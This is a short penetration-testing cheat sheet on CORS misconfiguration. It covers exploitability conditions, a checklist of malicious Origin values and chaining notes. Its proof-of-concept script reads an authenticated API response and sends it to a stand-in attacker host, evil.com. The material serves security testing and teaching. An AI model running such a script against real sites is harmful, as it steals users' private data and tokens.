# CORS Misconfiguration

**TL;DR**: an over-permissive CORS policy lets an attacker site read **authenticated** cross-origin responses → data/token theft. Key: `Access-Control-Allow-Credentials: true` + a controllable `Access-Control-Allow-Origin` (ACAO).

## What makes it exploitable
- Response contains **sensitive data** (PII, token, API key).
- Auth via **cookies** (or a header the attacker's JS can trigger).
- `ACAO` **reflects the Origin** OR accepts an attacker origin, AND `ACAC: true`.
- (Reminder: `ACAO: *` cannot be combined with credentials → wildcard without creds = usually not exploitable for authenticated data.)

## Tests (send a custom `Origin`, read the response headers)
- [ ] `Origin: https://evil.com` → response `ACAO: https://evil.com` + `ACAC: true`? → **exploitable**.
- [ ] `Origin: null` → `ACAO: null` accepted? (sandboxed iframe/`data:` yields `Origin: null`).
- [ ] **Weak prefix/suffix match**: `Origin: https://target.com.evil.com` or `https://evil-target.com` accepted? (badly anchored regex).
- [ ] **Arbitrary subdomain** accepted: `Origin: https://anything.target.com` → if a subdomain has XSS → chain.
- [ ] `Origin: https://evil.target.com` (too-broad whitelist).
- [ ] Scheme: `http://` accepted on an https site (downgrade / MITM).
- [ ] Substring `target.com`: `https://targetcom.evil.com`, `https://nottarget.com`.

## PoC (cross-origin read)
```html
<script>
fetch('https://target.com/api/me',{credentials:'include'})
 .then(r=>r.text()).then(d=>fetch('https://evil.com/log?d='+encodeURIComponent(d)));
</script>
```
(Use your own account as the victim for the proof.)

## Notes
- **Preflight** (`OPTIONS`): "non-simple" requests (JSON, custom headers, PUT/DELETE) trigger a preflight. A server that answers the preflight broadly may also be targeted.
- **`ACAC` absent**: without credentials, only public data is readable → low impact unless the API returns secrets without auth.
- **Chain**: XSS on a whitelisted subdomain, or CORS to steal a CSRF token → bypass anti-CSRF.

## Impact
- Authenticated data / token theft → often High. Depends on the sensitivity of the readable response.

## Caido
- Replay: add/vary `Origin`, inspect `Access-Control-Allow-Origin` / `-Credentials` in the response. Automate a list of malicious origins + grep-extract the reflected ACAO.

## References
- PortSwigger - CORS - https://portswigger.net/web-security/cors
- PortSwigger - CORS misconfig exploitation - https://portswigger.net/web-security/cors/access-control-allow-origin
- PayloadsAllTheThings - CORS Misconfiguration - https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/CORS%20Misconfiguration
- OWASP - HTML5 Security / CORS - https://cheatsheetseries.owasp.org/cheatsheets/HTML5_Security_Cheat_Sheet.html
- OWASP WSTG - Testing CORS - https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/07-Testing_Cross_Origin_Resource_Sharing
